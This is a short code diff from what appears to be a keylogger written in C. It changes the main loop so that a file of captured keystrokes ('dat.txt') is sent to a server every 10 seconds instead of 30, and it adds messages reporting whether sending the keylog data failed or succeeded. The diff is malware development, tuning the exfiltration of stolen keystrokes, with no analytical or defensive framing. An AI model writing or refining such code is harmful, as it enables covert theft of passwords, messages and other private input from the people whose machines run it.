@@ -76,9 +76,12 @@ int main()
 		}
 
 		end = clock();
-		if ((end - start) / CLOCKS_PER_SEC >= 30) {
+		if ((end - start) / CLOCKS_PER_SEC >= 10) {
 			start = end;
-			send_to_server("dat.txt");
+			if (send_to_server("dat.txt") != 0)
+				printf("[-] Fail sending keylog data\n\n");
+			else
+				printf("[+] Success sending keylog data\n\n");
 		}
 	}
 	return 0;
